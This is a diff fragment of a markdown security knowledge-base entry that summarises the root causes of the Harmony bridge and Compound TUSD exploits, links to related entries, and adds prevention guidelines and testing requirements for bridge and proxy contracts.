+  - Link: https://rekt.news/harmony-rekt/
+  - Root cause: Bridge custodied $100M+ with a 2-of-5 threshold — 40% key compromise ≈ full takeover
+- **Compound TUSD** — Legacy TUSD proxy bypasses sweepToken guard — Mar 2022 — Full cTUSD market
+  - Link: https://medium.com/chainsecurity/trueusd-compound-vulnerability-bc5b696d29e2
+  - Root cause: sweepToken checked `token != underlying` — legacy TUSD address passed but delegates to real TUSD
+
+### Related Entries
+- [Bridge Access Control Bypass (2021)](defihacklabs-bridge-patterns.md) — Poly Network, Chainswap
+- [Bridge Verification Bypass (2022)](defihacklabs-bridge-2022-patterns.md) — Nomad, Qubit, Meter
+- [Proxy Vulnerabilities](../../general/proxy/proxy-vulnerabilities.md)
+- [Signature Vulnerabilities](../../general/signature/signature-vulnerabilities.md)
 
 ---
 
-## Keywords
+## Prevention Guidelines
 
-bridge_security, cross_chain, address_collision, CREATE_nonce_replay, CREATE2, multisig_threshold, key_compromise, two_of_five, token_proxy, dual_address, legacy_proxy, sweep_bypass, bridge_drain, harmony, optimism, wintermute, compound_tusd, l2_replay, deterministic_address, proxy_delegation, unlockToken, sweepToken, defihacklabs
+### Development Best Practices
+1. Use CREATE2 with chain-specific salt for all cross-chain contract deployments
+2. Require multisig threshold >= 60% of total signers for high-value bridges
+3. Implement mandatory time delays and rate limiting for bridge unlock operations
+4. Check ALL known addresses for tokens (current proxy + legacy + aliases) in identity guards
+5. Before any token is integrated, verify whether it has multiple entry points via proxy delegation
+
+### Testing Requirements
+- Unit tests for: CREATE2 salt includes chainId, time delay enforcement on unlocks
+- Integration tests for: sweep guard with legacy proxy addresses, multisig threshold enforcement
+- Invariant tests for: bridge unlock volume bounded per time period, CREATE2 address consistency
